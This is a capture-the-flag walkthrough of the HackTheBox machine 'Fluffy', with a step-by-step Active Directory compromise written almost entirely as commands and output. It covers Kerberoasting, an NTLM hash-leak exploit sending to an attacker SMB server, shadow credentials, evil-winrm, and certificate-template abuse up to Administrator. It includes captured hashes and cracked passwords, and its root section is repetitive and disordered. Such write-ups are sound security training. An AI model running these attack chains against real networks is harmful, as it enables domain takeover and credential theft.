---
title: Fluffy - A HackTheBox machine
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - walkthrough
---
# Fluffy - A HackTheBox machine

## user.txt

Enumeration:

```bash
nmap 10.129.138.117
```

Output:

```text
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
5985/tcp open  wsman
```


```bash
nmap -p53,88,139,389,445,464,593,636,3268,3269,5985 -sV -sC -Pn --reason 10.129.138.117
```

The tester is given the credentials for the following account: j.fleischman / J0elTHEM4n1990!

```bash
j.fleischman / J0elTHEM4n1990!
```

Note the line: 

```text
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
```

The domain is fluffy.htb. Confirm with:

```bash
ldapsearch -H ldap://10.129.138.117 -x -s base defaultNamingContext
```

Add host mapping:

```bash
echo "10.129.138.117 fluffy.htb dc01.fluffy.htb" | tee -a /etc/hosts
```

Ensure time is in sync (Kerberos is picky): Keep skew < 5 minutes.

```bash
sudo ntpdate -s 10.129.138.117
```

Prepare a minimal krb5.conf (optional if using -dc-ip):

```
[libdefaults]
  default_realm = FLUFFY.HTB
  dns_lookup_realm = false
  dns_lookup_kdc = false

[realms]
  FLUFFY.HTB = {
    kdc = DC01.fluffy.htb
    admin_server = DC01.fluffy.htb
  }

[domain_realm]
  .fluffy.htb = FLUFFY.HTB
  fluffy.htb = FLUFFY.HTB
```


Create a TGT ticket using impacket. Directly asks the KDC for a TGT, saves it as a .ccache file. Export KRB5CCNAME to use it.


```bash
getTGT.py fluffy.htb/'j.fleischman':'J0elTHEM4n1990!'
j.fleischman / J0elTHEM4n1990!
export KRB5CCNAME=$(pwd)/j.fleischman.ccache
```

List stored tickets:

```bash
klist -l
```

Check ldap connection:

```bash
nxc ldap fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!'  -k 
```

Check smb connection:

```bash
nxc smb dc01.fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!' -k --shares
```

Output:

```bash
SMB         dc01.fluffy.htb 445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
SMB         dc01.fluffy.htb 445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
SMB         dc01.fluffy.htb 445    DC01             [*] Enumerated shares
SMB         dc01.fluffy.htb 445    DC01             Share           Permissions     Remark
SMB         dc01.fluffy.htb 445    DC01             -----           -----------     ------
SMB         dc01.fluffy.htb 445    DC01             ADMIN$                          Remote Admin
SMB         dc01.fluffy.htb 445    DC01             C$                              Default share
SMB         dc01.fluffy.htb 445    DC01             IPC$            READ            Remote IPC
SMB         dc01.fluffy.htb 445    DC01             IT              READ,WRITE      
SMB         dc01.fluffy.htb 445    DC01             NETLOGON        READ            Logon server share 
SMB         dc01.fluffy.htb 445    DC01             SYSVOL          READ            Logon server share 
```


```bash
smbclient.py dc01.fluffy.htb  -k 
```

After downloading files, nothing valuable is found.

Run bloodhound:

```
bloodhound-python -u j.fleischman -p 'J0elTHEM4n1990!' -k -ns $ip -c All -d fluffy.htb --zip   
```

Conduct a kerberoast attack:

```bash
python ~/tools/ActiveDirectory/fromLinux/targetedKerberoast/targetedKerberoast.py -k --dc-host dc01.fluffy.htb -u j.fleischman -d fluffy.htb
```

Save the tickets:

```bash
echo '$krb5tgs$23$*ca_svc$FLUFFY.HTB$fluffy.htb/ca_svc*$61ee62fc7f26e29a9c7dd4947569fdd1$f3fbb75728391beaf4f8b85f451e545f76ffd5761dcedbe787c4784e9cf8e1a9f96ee07aa9fde13c0eaa7036b2dc48b8b4b26971be41516b42bc16d45bdd781181cc0264bb0197f609b7a99196431bcc9049c13d694de7690ee8fb364f81c870fcc6bb96563099885c895a6c94eac361b161e90e877afc19b87dec9bf783f11e4078d05daed9ea5d9131cf9926d14461ddf1302ca5b65c1c152aaaa5931601ff0526bbd8dca14c8e63ea461ed5adc421ce5cd6ce494199146d037503e6e49659619e1191a95b1b2dfb8c284e86e93d56b5fa66f8edd6240c72d9e2ba0c17f9773af4acd52f7d499cd0821c8cc04ab91b4f94d26216b71d5fe59d3bd66169deafa429bc4176bc28d34f862d77fc06cdc884a03dfda81a089efcafa98872204c4ab2cdb2d3cc0b8c625c63031b25d8e015add40fc4aefcdd040161e7a1aed338679f28a2ddd931dd01576061a7705f68ddb23f9ea7aa3bc6768073339263a053a9319004c163214a9f9f57dfad573d8094057a1bb2136913a012f2dfa263cc40e0088730b19599ce162c1f46e1219c93776fb115f8ec7b47711ae039c5d77a6ef222a63ffe61cbc401fd4f871e68f42ae203efd7102a99574ed6a2ec62f5609857cfc75b3d7c65795ed34d0f1d43439487bbe121d6fe55d2f2f8f88c21d0159db1a6a090d99c70c10a0e1fc41013340bbebda04796b58e19187a2fdb4d7f2b1efdea1f95a35518a97578f6c0da7520370ebc58d681293829401d7cc522efe795bad47085ccbb3df67b772445b2cd77d1253582a587212b838e2a1b13fc850aaa7b1ecef4d36f8e10fce52d754a70bad4bce4e7499ece68c9d050f513ca079578f5ced58a6f5a42dc70809f293a4a01d2dd63cee6e3a19c8ea95ed5f55fbf77b26c7bc81c228fe22cc5dca10fb01d8171b99804dd0077c396f6437e890ca926d1c3b4959873f2054dcc5c8ae147ef52c568c4ebcb0ed91491006b8dfc8f4c5c825835c1ce9887b8275c46ee2194a6ed9e7f71506b608264c1bf5eea4a651ee135190f0076934efcf3aae5bdbdc0caee029c3f562cd7b4445013d9db93a38b4b8181a92b51954fd3599be864a2532f8cb9cb502b3982d339a698e687ce5aa58d465b6aaef19f855a6ad0027471936004cc88187cce43419c68697ee0b414176a4855470f49319a6a2fc2fefef06862048f145941bcd58baff6e3193ad39b44d839acc438d514ef46c4a10936a720a966bf813e0afcc3667855c63e091937a96d124949ac3230087e276e57112e63e85bb565816787f4642fd1709805f15efcdb441ca911db4eda0540b49ae70f574c86540f728e027c9aafbf5fbf9f31a34a28a0006c611eb179b4c7c99a56133585f5c2cdf1d9ae5678f42bc956e6795f8291dd51dbe9ca696b19290bfbb81ebf0522481a6ce11630e1ef77e582167033341b768e823221cfdd76b4c68f8843c7ab5468121b25a0de9d450bb51160933cd5f895be06ea06898cf5e0898b92148ad21a79a3fb9ef70303c85693d8a00b339449fe3df40c880a8451eb' > ca_svc.txt

echo '$krb5tgs$23$*ldap_svc$FLUFFY.HTB$fluffy.htb/ldap_svc*$b5f20815274d9ae46b42069b9f6dd259$ff0426b789b66e24d7e8bc831ef7dd62ad01b6e3c3c302fe8a834516a23be658514722a1c0e12546ca1039a8ccdd163497ad941ea739f2e4c85c80af2e389a04ed8ec83397aad88907e1b2ecc5b8ff98e6d0b3826baa127d650c6683cdeb79562d6caab0927c185377108babf2b05ad362309df2359e290c894027d41542ecf138bd586467263893627481301f3eff7a6e0d4284c41c648673047dcd657d5b47cc7a57d6f346590dd108a8a040dbb9e72664472f80898f017d2bc886487db6f61a205302aadcc745743e7791c6c4d9ef92b2e92f0bc7855a97a70eeac074877a5e95d178d669011df2bb97fc3c5e554893e7164d0d938d74372b64fa27fb7ec85df8076b5a8b404ae8800aa801ee4139ca0ce27708df30eaee459e0f7000c41c939707cceba99c6b6b71228a29177db11e49fdf1a144460eed3df19e9fde089672b5394392ae696941b0451fb0281027cafd637c90ed15fe599dcaacc80d0377c4d536f8ac13c2825e62d26e530621875a7c9ac4f76510be31eac6d5a9c5b752ebf21a956c43d9a3dae0f041c64ccaf318b3fddad09178dccea6906815d63cddb97b1ecca6a15a78971eb9d64f6629159e2d0c08f11b9c4c353a8f4f3c87d375e6baca118a003e4636b40bc11caad0b485cf1707b46e89104aa72189964d2a10dfec6d4a346a7c867a00e3949213a7a49341a264bacf341e8bf2483dabb95f71cb443aa82813bda9c996c3be474096b08ea190944adb32b37c9db3c01ff4e7263eec26c8bf050251b10c76205923dcdb1bb8a35b4c099383cba711a2b6b88a0a6740e9072b769b8c27f40ac371825a3966c4e71cde955787395485485f7af2e15f38a0289193afe34c3696f7ba63184bbd4c77542a2959dd066910e83d988548b918e0f0594743133baa54724e6baa8cdef2a29e7e611d8af5f3db232e28136a2d8662f40a28602cd1672af7ccf44c9e3445ce6883a66e2340316cf9d2539525c31508a8c3bf55cedf82d86290bfd39681254cfe931bd68fd7ee1a8dda7100ca3b55c0c3b21e5d0d26759dd022b9aed57b6df3055dcc50c19bceb22686c9f36d206d93c37ccef732d6cbaa9dc829406a1f4cb899f84afd0405c23c3521cb825b6b026889d0883d4dcf831a3af48820e316fe250174d79f5729f034026b38a92905a6885459ee12b71e8e60e877b1ab9292a7c4e2c8401f6db383f78ceb4322df5256c98307e0dc0e269e4e232745c96edb83b0ef98a044397403612f8218c35474231633af3b5d71656f945de0c76b83df611f671acf4dcaaac5b88e7e4bf3f75e2493eb200af0ba0bb67d7ef7c714c780c3832ab3fd1aa71cc67681a4d835ecf6f3f8bd8c2088e61f01acb3a292a10de0b089fc1a46026c767f41ed8f28de78bacc04fc6901b1a9af4b4f529d7ff0839bd90efbc8eda51d58dc2eef5dd1fae0fddfaf7c73e31b3812286fdf1ed95beace4896c96cf67d47a1c719153d0abc143d1cc0a8d789ee8572bde5fa26c0510a2b4eb2c99959cfd3d2660d04e8bda81b4dd039d2b194a0' > ldap_svc.txt


echo '$krb5tgs$23$*winrm_svc$FLUFFY.HTB$fluffy.htb/winrm_svc*$051b26b77cc357efadbc6d5e186b67ae$1fdeb8b40b3c50883e316e0f4e82974c8bd31d53d2622a334c82802834c822391afe7fd72acccbdfa0ce49a5bcbb9bd22ae3da30935e08a2b6137b7bb7480f03180594985654a058b8be462c7f1e8366653efe6dda6b1afc2b134671f2ee2d2bf7ede486e7b7e3ace028f4150f514116bd5714d714024000c9680e6538d88d6bd4a3ae6e1fd28a9ed0e981405c941f2c583147bc68c08dad9f9923d8ceb1ecc94fafc4171f66667ddfbfaf12a8698bd459989d921c80153a96adabb0aa5b4114026b35ce13aa9813a9bb9bd6e0197a83694b6edd70a5f982a5a86e1244b9a2f9a25777ee9dfd6545deaf43d6a4962afe17660ad5cfebb96bbf21b4a43a0c341ba4b2cc422c67aa164b83f2fa340ed77bad255983d15d86d029c2967000722276afd1cb4c5a557d53801e56ae8a61170dbb84b69a64bb3eddd0c5f5f8f7eb9454fbb7fcf06fa02a4711b029afe363c5eda6e9dcb0856792dd95aeb4d37ae8ec5cec14c20e29642175f31656b7bcfa8bb9cb4a556f8abdcb84b65b0968eae0d5e51f96192fc58fe8998ea6aa8d6bf9f21ce740ad7a08b28938b7a450e1ce72c1e520103c28e54501d32c486b6f334694f2f040a9e5c6da9137aa599d97a398f96d011a22a35541e4553fbca7026d03ca7f6eba5ce9ea3e37a4bcd533df06a4505207b23722067a3fa9190b8a05cc0eb00692a05bf98d8a4cdc5e1b8391093b6542e0389bca64b88aa16ca92568ce8d9e19b643e9cd04dfbee7694d01721103f597ad0e49dd0b421fc4e749bff8a9fc19687ce4f192b4a01217871e41a021443f26630b30d04034f43e5509bfc33d26356638255319a0ed4188ec3689e95a72b7b3ba15aa790ecd229414a2f8ddc6249e3314ab9446e2f2b0492f24df4de052e21ae252803184789d950037419f382848ef3e5f8a0862ac19a12f7f800b0fdc16d8a80c07f485ec6b09b263697672d82599043f577ad2d874b8123e998e038b0cabeb52484d0d71bfcc497b68484295afc7abac1252927769c67c67131d36eea3d56214280b3d7dd5a630731533221d49f814e926f28035f779532a3c3d6c232306a3f16c39da66beea5a3c441d8636e593105a09645a743e2ae5976219ace14376faaae2b3fa4154b79316d48afed63e9787fc054db7f94cc031cd3e323e55c9b1c1991362d990b4534e5a9112a52b0ac0e32e17dc7bc800115caa8efff7a4f703a5dc42d52e4d063f776afb6151cc8811ba16ad528fc920332de60b2371ad7fc223ab282fdc764ba82a8b3ef556b62251a6189f5e8cd087d00dba109df523fde86ac6064b8ddf65743e7c77c1d6a4047b65a9e8eaaf430532b2382614d6de8779a63033f7ec51c2057170c359b69e080672ccb0208037d69f29db7c6cd33b2ec9ee50df7cb9ecd806b54bab0fa3ae51607631ddfe7f45b2f0f3449a829bedd24a37a4d71d23b924136c7aea176734518dedd8dd7c30ba26b3ac7c9cca2564ce5e74b526c8f40e50fb08e61542d36ce30f05ee884436fe7afe6d63522131f04a80d93727f2ebcb5c' > winrm_svc.txt


```

Crack them:

```bash
hashcat -m 13100 ca_svc.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 13100 ldap_svc.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 13100 winrm_svc.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule


```

In smb enumeration, the share IT contained the file `Upgrade_Notice.pdf`, which listed some vulnerabilities affecting the domain. One of them is CVE-2025-24071. See exploit https://github.com/FOLKS-iwd/CVE-2025-24071-msfvenom. 

```bash
git clone https://github.com/FOLKS-IWD/CVE-2025-24071-msfvenom.git

cp ntlm_hash_leak.rb /home/lala/tools/metasploit-env/metasploit-framework/modules/auxiliary/server/

msfconsole -q -x "reload_all; search ntlm_hash_leak"

use 0
show info
set ATTACKER_IP 10.10.14.129
set SHARE_NAME IT
set LIBRARY_NAME malicious.library-ms


set ATTACKER_IP 10.10.14.129  
set FILENAME exploit.zip      
set LIBRARY_NAME malicious.library-ms  
set SHARE_NAME IT

run

use auxiliary/server/capture/smb
set SRVHOST 10.10.14.129 
run

use auxiliary/server/ntlm_hash_leak
run
```

After a while, the tester obtain:

```
[+] Received SMB connection on Auth Capture Server!
[SMB] NTLMv2-SSP Client     : 10.129.138.117
[SMB] NTLMv2-SSP Username   : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash       : p.agila::FLUFFY:bf50c44ccc9a307a:e774236bcf6a255aa19bb54d37779d3f:010100000000000000a87f20381adc01928bbb29b09a3781000000000200120057004f0052004b00470052004f00550050000100120057004f0052004b00470052004f00550050000400120057004f0052004b00470052004f00550050000300120057004f0052004b00470052004f00550050000700080000a87f20381adc010600040002000000080030003000000000000000010000000020000045f37a60fd4759758c7d049ea3ebc0724a54ef45651949dea18694e68efc257e0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003100320039000000000000000000

[+] Received SMB connection on Auth Capture Server!
[SMB] NTLMv2-SSP Client     : 10.129.138.117
[SMB] NTLMv2-SSP Username   : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash       : p.agila::FLUFFY:ff2e05ec55b25572:4d4c133a6390a4c141a96c57e840f6d5:010100000000000000a87f20381adc019011399d08f7b612000000000200120057004f0052004b00470052004f00550050000100120057004f0052004b00470052004f00550050000400120057004f0052004b00470052004f00550050000300120057004f0052004b00470052004f00550050000700080000a87f20381adc010600040002000000080030003000000000000000010000000020000045f37a60fd4759758c7d049ea3ebc0724a54ef45651949dea18694e68efc257e0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003100320039000000000000000000

[+] Received SMB connection on Auth Capture Server!
[SMB] NTLMv2-SSP Client     : 10.129.138.117
[SMB] NTLMv2-SSP Username   : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash       : p.agila::FLUFFY:38b3894561d8b3a8:b5e64d5ef5ec189a3dc139345bd15b77:0101000000000000803e1821381adc019ddb2dae08944086000000000200120057004f0052004b00470052004f00550050000100120057004f0052004b00470052004f00550050000400120057004f0052004b00470052004f00550050000300120057004f0052004b00470052004f005500500007000800803e1821381adc010600040002000000080030003000000000000000010000000020000045f37a60fd4759758c7d049ea3ebc0724a54ef45651949dea18694e68efc257e0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003100320039000000000000000000

[+] Received SMB connection on Auth Capture Server!
[SMB] NTLMv2-SSP Client     : 10.129.138.117
[SMB] NTLMv2-SSP Username   : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash       : p.agila::FLUFFY:fc86886a0dec7adb:7af2bd8ac505d2d53dd2021136007595:0101000000000000803e1821381adc01466a7656721c2252000000000200120057004f0052004b00470052004f00550050000100120057004f0052004b00470052004f00550050000400120057004f0052004b00470052004f00550050000300120057004f0052004b00470052004f005500500007000800803e1821381adc010600040002000000080030003000000000000000010000000020000045f37a60fd4759758c7d049ea3ebc0724a54ef45651949dea18694e68efc257e0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003100320039000000000000000000

[+] Received SMB connection on Auth Capture Server!
[SMB] NTLMv2-SSP Client     : 10.129.138.117
[SMB] NTLMv2-SSP Username   : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash       : p.agila::FLUFFY:84e6f7085bbf2b9b:a822a53defd99907bd8ea5697a59a034:010100000000000000d5b021381adc01f1fe3a47ace26d19000000000200120057004f0052004b00470052004f00550050000100120057004f0052004b00470052004f00550050000400120057004f0052004b00470052004f00550050000300120057004f0052004b00470052004f00550050000700080000d5b021381adc010600040002000000080030003000000000000000010000000020000045f37a60fd4759758c7d049ea3ebc0724a54ef45651949dea18694e68efc257e0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003100320039000000000000000000

[+] Received SMB connection on Auth Capture Server!
[SMB] NTLMv2-SSP Client     : 10.129.138.117
[SMB] NTLMv2-SSP Username   : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash       : p.agila::FLUFFY:2d8d656e22a30132:0bb7686c64131538696eaf6bf9e51947:010100000000000000d5b021381adc01097d5443c9dbde89000000000200120057004f0052004b00470052004f00550050000100120057004f0052004b00470052004f00550050000400120057004f0052004b00470052004f00550050000300120057004f0052004b00470052004f00550050000700080000d5b021381adc010600040002000000080030003000000000000000010000000020000045f37a60fd4759758c7d049ea3ebc0724a54ef45651949dea18694e68efc257e0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003100320039000000000000000000

[+] Received SMB connection on Auth Capture Server!
[SMB] NTLMv2-SSP Client     : 10.129.138.117
[SMB] NTLMv2-SSP Username   : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash       : p.agila::FLUFFY:533f3468389909e9:6164d5f244652596ebc215b3f9ce3955:010100000000000000d5b021381adc01f7b5807a65d52737000000000200120057004f0052004b00470052004f00550050000100120057004f0052004b00470052004f00550050000400120057004f0052004b00470052004f00550050000300120057004f0052004b00470052004f00550050000700080000d5b021381adc010600040002000000080030003000000000000000010000000020000045f37a60fd4759758c7d049ea3ebc0724a54ef45651949dea18694e68efc257e0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003100320039000000000000000000

```

The tester cracks the hash offline:

```bash
echo "p.agila::FLUFFY:533f3468389909e9:6164d5f244652596ebc215b3f9ce3955:010100000000000000d5b021381adc01f7b5807a65d52737000000000200120057004f0052004b00470052004f00550050000100120057004f0052004b00470052004f00550050000400120057004f0052004b00470052004f00550050000300120057004f0052004b00470052004f00550050000700080000d5b021381adc010600040002000000080030003000000000000000010000000020000045f37a60fd4759758c7d049ea3ebc0724a54ef45651949dea18694e68efc257e0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003100320039000000000000000000" > p.agila.txt


hashcat -m 5600 p.agila.txt /usr/share/wordlists/rockyou.txt
```

Results:

```
p.agila:prometheusx-303
```

Create a TGT ticket for user p.agila:

```bash
getTGT.py fluffy.htb/'p.agila':'prometheusx-303' 


export KRB5CCNAME=$(pwd)/p.agila.ccache  
nxc smb dc01.fluffy.htb -u p.agila -p 'prometheusx-303' -k --shares
```

Run bloodhound:
```
bloodhound-python -u p.agila -p 'prometheusx-303' -k -ns $ip -c All -d fluffy.htb --zip   
```

Note that user p.agila belongs to the `SERVICE ACCOUNTS MANAGER` group, which has GenericAll permissions on the `SERVICE ACCOUNTS` group. According to bloodhound this can be abused from Linux with the command:

```bash
net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"
```

The tester run it:

```bash
net rpc group addmem "SERVICE ACCOUNTS" "p.agila" -U "FLUFFY.HTB"/"p.agila"%"prometheusx-303" -S "DC01.FLUFFY.HTB"
```

Run bloodhound again and check that the user has been added to the group.

```bash
bloodhound-python -u p.agila -p 'prometheusx-303' -k -ns $ip -c All -d fluffy.htb --zip   
```

Now the p.agila  is a member of `SERVICE ACCOUNTS` group. This group has GenericWrite access on the users: CA_SVC, LDAP_SVC, and  WINRM_SVC. According to bloodhound this can be abused with [pywhisker](https://github.com/ShutdownRepo/pywhisker) with the command.

```bash
pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"
```

```bash
python ~/tools/ActiveDirectory/fromLinux/pywhisker/pywhisker/pywhisker.py -d "fluffy.htb" -u "p.agila" -p "prometheusx-303" --target "winrm_svc" --action "add"
```

Output:

```bash
[*] Searching for the target account
[*] Target user found: CN=winrm service,CN=Users,DC=fluffy,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: f82264d5-e53f-d016-e893-dc932bc81eab
[*] Updating the msDS-KeyCredentialLink attribute of winrm_svc
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[+] Saved PFX (#PKCS12) certificate & key at path: XoZkIerG.pfx
[*] Must be used with password: 8a9LW5S4uxenYkJVXWi5
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools

```

Once the values are generated and added by pyWhisker, a TGT can be request with [gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py). The NT hash can then be recovered with [getnthash.py](https://github.com/dirkjanm/PKINITtools/blob/master/getnthash.py). These are the commands referred in the documentation:

```bash
python3 PKINITtools/gettgtpkinit.py -cert-pfx test1.pfx -pfx-pass xl6RyLBLqdhBlCTHJF3R domain.local/user2 user2.ccache

python3 PKINITtools/getnthash.py -key f4d6738897808edd3868fa8c60f147366c41016df623de048d600d4e2f156aa9 domain.local/user2
```

The tester run:

```bash
python ~/tools/ActiveDirectory/fromLinux/PKINITtools/gettgtpkinit.py -cert-pfx XoZkIerG.pfx -pfx-pass 8a9LW5S4uxenYkJVXWi5 FLUFFY.HTB/winrm_svc winrm_svc.ccache

export KRB5CCNAME=$(pwd)/winrm_svc.ccache

python ~/tools/ActiveDirectory/fromLinux/PKINITtools/getnthash.py -key a1cbf2b7a6a144b75e912f01607fef3d54962694227450ebbe14e95936a508c0 FLUFFY.HTB/winrm_svc
```

Recovered NT hash: 33bd09dcd697600edf6b3a7af4875767


With the winrm_svc.ccache, connect to the machine:

```bash
export KRB5CCNAME=$(pwd)/winrm_svc.ccache
evil-winrm -i dc01.fluffy.htb -k winrm_svc.ccache -r fluffy.htb
```

The tester can also connect with hash:

```
evil-winrm -i 10.129.138.117 -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767
```

In the evil-winrm connection, print the flag:

```powershell
type C:\Users\winrm_svc\Desktop\user.txt
```


## root.txt

```
evil-winrm -i 10.129.138.117 -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767
```

```bash
certipy account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.129.138.117' -user 'ca_svc' read

```

Output:

```
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Reading attributes for 'ca_svc':
    cn                                  : certificate authority service
    distinguishedName                   : CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
    name                                : certificate authority service
    objectSid                           : S-1-5-21-497550768-2797716248-2627064577-1103
    sAMAccountName                      : ca_svc
    servicePrincipalName                : ADCS/ca.fluffy.htb
```

enumerate AD CS as **ca_svc** (look for an abuseable template). NTLM with the ca_svc NT hash (no Kerberos needed)

```bash
certipy find -u 'ca_svc@fluffy.htb' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.129.138.117 -vulnerable -stdout 
```


Output:

```
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Trying to get CA configuration for 'fluffy-DC01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'fluffy-DC01-CA' via CSRA: Could not connect: timed out
[*] Trying to get CA configuration for 'fluffy-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'fluffy-DC01-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : fluffy-DC01-CA
    DNS Name                            : DC01.fluffy.htb
    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5
    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
    Certificate Validity End            : 3024-04-17 16:11:16+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : FLUFFY.HTB\Administrators
      Access Rights
        ManageCa                        : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        ManageCertificates              : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        Enroll                          : FLUFFY.HTB\Cert Publishers
Certificate Templates                   : [!] Could not find any certificate templates

```


Request a certificate as the “victim” user from any suitable client authentication template (e.g., “User”) on the ESC16-vulnerable CA

```bash
certipy find -u 'ca_svc@fluffy.htb' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.129.138.117 -vulnerable -stdout 


certipy req -k -dc-ip '10.129.138.117' -target 'DC01.FLUFFY.HTB' -ca 'fluffy-DC01-CA' -template 'User'--debug

certipy account  -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.129.138.117' -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update


certipy req -u 'ca_svc@fluffy.htb' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.129.138.117 -ca 'fluffy-DC01-CA' -template 'VulnerableTemplate' -alt 'UPN=administrator@fluffy.htb' -outfile administrator

certipy auth -pfx administrator.pfx -dc-ip 10.129.138.117
# You now have an Administrator TGT
```


The tester run it:

```bash
net rpc group addmem "SERVICE ACCOUNTS" "p.agila" -U "FLUFFY.HTB"/"p.agila"%"prometheusx-303" -S "DC01.FLUFFY.HTB"
```

Now the p.agila  is a member of `SERVICE ACCOUNTS` group. This group has GenericWrite access on the users: CA_SVC, LDAP_SVC, and  WINRM_SVC. According to bloodhound this can be abused with [pywhisker](https://github.com/ShutdownRepo/pywhisker) with the command.

```bash
python ~/tools/ActiveDirectory/fromLinux/pywhisker/pywhisker/pywhisker.py -d "fluffy.htb" -u "p.agila" -p "prometheusx-303" --target "ca_svc" --action "add"
```

Output:

```bash
[*] Searching for the target account
[*] Target user found: CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 8211bf29-a248-4369-e8a8-7ce278d7abda
[*] Updating the msDS-KeyCredentialLink attribute of ca_svc
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[+] Saved PFX (#PKCS12) certificate & key at path: vjNqKkzw.pfx
[*] Must be used with password: Lam0SPCmlquf5ZPWGQHp
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

Once the values are generated and added by pyWhisker, a TGT can be request with [gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py). The NT hash can then be recovered with [getnthash.py](https://github.com/dirkjanm/PKINITtools/blob/master/getnthash.py).  The tester run:

```bash
python ~/tools/ActiveDirectory/fromLinux/PKINITtools/gettgtpkinit.py -cert-pfx vjNqKkzw.pfx -pfx-pass Lam0SPCmlquf5ZPWGQHp FLUFFY.HTB/ca_svc ca_svc.ccache

export KRB5CCNAME=$(pwd)/ca_svc.ccache

python ~/tools/ActiveDirectory/fromLinux/PKINITtools/getnthash.py -key a2de5db64bd6a7e05bd26152bdb7196b2da47ce471688edf29a0360219d4b7d7 FLUFFY.HTB/ca_svc
```

Recovered NT hash: ca0f4f9e9eb8a092addf53bb03fc98c8


```bash
certipy req -k -dc-ip '10.129.138.117' -target 'DC01.FLUFFY.HTB' -ca 'fluffy-DC01-CA' -template 'User'
```


```
certipy shadow -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.129.138.117' -account 'ca_svc' auto


certipy find -vulnerable -u ca_svc@fluffy.htb -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.129.138.117 -stdout

certipy account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.129.138.117' -upn 'administrator' -user 'ca_svc' update

```

Revert the “victim” account’s UPN.

```bash
certipy account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.129.138.117' -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update
```

Output:

```
[*] Updating user 'ca_svc':
 userPrincipalName                   : ca_svc@fluffy.htb
[*] Successfully updated 'ca_svc'
```


Authenticate as the target administrator.

```bash
certipy auth -dc-ip '10.129.138.117' -pfx 'administrator.pfx' -username 'administrator' -domain 'fluffy.htb'
```

```
